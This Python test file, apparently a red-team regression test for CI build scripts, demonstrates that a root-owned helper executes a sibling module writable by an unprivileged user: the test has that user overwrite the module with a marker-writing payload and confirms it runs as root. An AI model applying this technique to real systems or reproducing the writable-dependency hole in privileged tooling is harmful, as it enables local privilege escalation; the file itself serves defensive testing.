#!/usr/bin/env python3
"""Exploit-positive witness for mutable adjacent snapshot code under root custody."""

from __future__ import annotations

import hashlib
import importlib.util
import os
from pathlib import Path
import shutil
import stat
import tempfile
import unittest

REPOSITORY = Path(__file__).resolve().parents[3]
ROOT_HELPER = REPOSITORY / "scripts/ci/capture_accepted_build_root_custody.py"
SNAPSHOT_HELPER = REPOSITORY / "scripts/ci/capture_accepted_build_input_snapshot.py"


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


class CaptureBuildRootMutableSnapshotRootExecRedTeamTests(unittest.TestCase):
    def test_root_custody_helper_executes_field_mutable_adjacent_snapshot_module(self) -> None:
        if os.geteuid() != 0:
            self.fail("red-team witness must run as root")
        field_uid = int(os.environ["NEMBRA_FIELD_UID"], 10)
        field_gid = int(os.environ["NEMBRA_FIELD_GID"], 10)
        if field_uid <= 0 or field_gid <= 0:
            self.fail("red-team witness requires one ordinary field identity")

        with tempfile.TemporaryDirectory(prefix="nembra-build-root-mutable-helper-") as raw:
            sandbox = Path(raw)
            bundle = sandbox / "bundle"
            bundle.mkdir(mode=0o755)
            copied_root = bundle / ROOT_HELPER.name
            copied_snapshot = bundle / SNAPSHOT_HELPER.name
            shutil.copyfile(ROOT_HELPER, copied_root)
            shutil.copyfile(SNAPSHOT_HELPER, copied_snapshot)

            # Isolate the dependency flaw: the root-custody entrypoint itself is frozen
            # root-owned/read-only, while only its dynamically imported sibling remains
            # field-owned and writable.
            os.chown(copied_root, 0, 0)
            os.chmod(copied_root, 0o444)
            os.chown(copied_snapshot, field_uid, field_gid)
            os.chmod(copied_snapshot, 0o644)
            frozen_root_digest = sha256(copied_root)

            marker = sandbox / "root-exec-marker.txt"
            payload = (
                "from pathlib import Path\n"
                "import os\n"
                f"Path({str(marker)!r}).write_text(f'uid={{os.geteuid()}} gid={{os.getegid()}}\\n', encoding='utf-8')\n"
            )

            pid = os.fork()
            if pid == 0:
                try:
                    os.setgroups([field_gid])
                    os.setgid(field_gid)
                    os.setuid(field_uid)
                    copied_snapshot.write_text(payload, encoding="utf-8")
                except BaseException:
                    os._exit(70)
                os._exit(0)
            waited, status = os.waitpid(pid, 0)
            self.assertEqual(waited, pid)
            self.assertTrue(os.WIFEXITED(status))
            self.assertEqual(os.WEXITSTATUS(status), 0)
            self.assertEqual(copied_snapshot.stat().st_uid, field_uid)
            self.assertFalse(marker.exists())

            spec = importlib.util.spec_from_file_location(
                "nembra_build_root_mutable_snapshot_root_exec", copied_root
            )
            if spec is None or spec.loader is None:
                self.fail("could not load frozen root-custody helper")
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            self.assertTrue(marker.is_file())
            marker_metadata = marker.lstat()
            self.assertTrue(stat.S_ISREG(marker_metadata.st_mode))
            self.assertEqual(marker_metadata.st_uid, 0)
            self.assertEqual(marker.read_text(encoding="utf-8"), "uid=0 gid=0\n")
            self.assertEqual(sha256(copied_root), frozen_root_digest)

            source = copied_root.read_text(encoding="utf-8")
            self.assertIn(
                'path = Path(__file__).with_name("capture_accepted_build_input_snapshot.py")',
                source,
            )
            self.assertIn("snapshot = _load_snapshot_module()", source)


if __name__ == "__main__":
    unittest.main(verbosity=2)
